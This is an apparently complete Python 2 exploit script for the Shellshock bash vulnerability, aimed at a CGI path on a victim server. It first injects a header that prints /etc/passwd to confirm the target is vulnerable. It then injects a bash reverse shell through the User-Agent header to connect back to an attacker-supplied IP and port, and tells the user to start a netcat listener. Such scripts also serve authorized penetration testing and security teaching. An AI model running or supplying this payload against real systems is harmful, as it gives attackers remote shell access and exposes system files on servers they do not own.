#!/usr/bin/python

###############################
#  http://github.com/r4v10l1  #
###############################

import sys
import requests
import time
 
if len(sys.argv) < 4:
	print "\n[*] Shellshock Exploit (Reverse shell)"
	print "[*] Usage: <Victim IP> <Vulnerable .cgi path> <Your IP> <Reverse Shell Port>" 
	print "[*]"
	print "[*] Example: shellshock.py 192.168.1.X /here/your.cgi 127.0.0.1 4444"
	print "[*] Listener: nc -lvp <port>"
	print "\n"
	sys.exit()

#Disables request warning for cert validation ignore.
requests.packages.urllib3.disable_warnings() 
ucs = sys.argv[1]
cgipath = sys.argv[2]
url = "http://" + ucs + cgipath #HERE IS YOUR .cgi VULNERABLE PATH (example: /path/foo.cgi)
attackhost = sys.argv[3]
revshellport = sys.argv[4]
headers1 = {
		'User-Agent': '() { ignored;};/bin/bash -i >& /dev/tcp/' + attackhost + '/' + revshellport + ' 0>&1'
		}
headers2 = {
		"User-Agent": '() { test;};echo \"Content-type: text/plain\"; echo; echo; echo $(</etc/passwd)'
		}

def exploit():
	try:
		r = requests.get(url, headers=headers1, verify=False, timeout=5)
	except Exception, e:
		if 'timeout' in str(e):
			print "[+] Success.  Enjoy your shell..."
		else:
			print "[-] Something is wrong..."
			print "[-] Error: " + str(e)

def main():
	try:
		r = requests.get(url, headers=headers2, verify=False, timeout=3)
		if r.content.startswith('\nroot:'):
			print "[+] Host is vulnerable, spawning shell..."
			time.sleep(3)
			exploit()
		else:
			print "[-] Host is not vulnerable, quitting..."
			sys.exit()
	except Exception, e:
		print "[-] Something is wrong..."
		print "[-] Error: " + str(e)

if __name__ == "__main__":
	main()

